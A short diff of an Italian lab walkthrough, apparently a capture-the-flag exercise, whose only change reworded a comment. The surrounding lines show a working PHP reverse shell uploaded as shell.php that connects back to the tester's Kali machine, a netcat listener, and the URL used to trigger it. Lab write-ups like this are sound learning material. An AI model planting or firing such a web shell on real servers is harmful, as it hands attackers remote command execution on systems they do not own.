@@ -95,7 +95,7 @@ A questo punto, all'interno della directory ./var/www, creo un nuovo file .php c
 Shell.php avrà il codice PHP per una reverse shell (vedi GitHub --> swisskyrepo/PayloadsAllTheThings/Methodology and Resources/Reverse Shell Cheatsheet.md):
 	<?php
         	$sock=fsockopen("192.168.56.16", 1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
-        	#192.168.56.16 è l'indirizzo IP della macchina Kali su cui sto lavorando
+        	#192.168.56.16 è l'indirizzo IP della macchina Kali Linux su cui sto lavorando
 	?>
 Dopodiché ho aperto una nuova istanza di terminale per mettermi in ascolto sulla porta 1234 --> nc -lvnp 1234
 Sul browser --> http://192.168.56.103/shell.php
